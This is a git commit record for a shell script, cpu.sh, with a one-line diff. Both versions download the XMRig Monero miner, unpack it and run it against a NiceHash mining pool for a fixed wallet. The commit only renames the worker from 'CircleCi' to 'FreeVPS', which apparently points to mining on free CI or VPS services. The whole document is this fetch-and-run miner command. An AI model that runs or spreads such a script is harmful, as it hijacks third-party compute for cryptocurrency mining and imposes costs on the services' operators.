2a7ab8237235bf8f692b5ada6d39aedd99de1cfa
MomboteQ <60738939+MomboteQ@users.noreply.github.com>
2022-04-28 17:17:41 +0200

    Update cpu.sh

--- cpu.sh
+++ cpu.sh
@@ -1,1 +1,1 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz && tar xf xmrig-6.16.4-linux-x64.tar.gz && cd xmrig-6.16.4 && ./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 35maF4TVKyx17a2ooSzQFH5XFE9VvuHLF2.CircleCi -p x -k -a rx/0 --nicehash
+wget https://github.com/xmrig/xmrig/releases/download/v6.16.4/xmrig-6.16.4-linux-x64.tar.gz && tar xf xmrig-6.16.4-linux-x64.tar.gz && cd xmrig-6.16.4 && ./xmrig -o stratum+tcp://randomxmonero.auto.nicehash.com:9200 -u 35maF4TVKyx17a2ooSzQFH5XFE9VvuHLF2.FreeVPS -p x -k -a rx/0 --nicehash
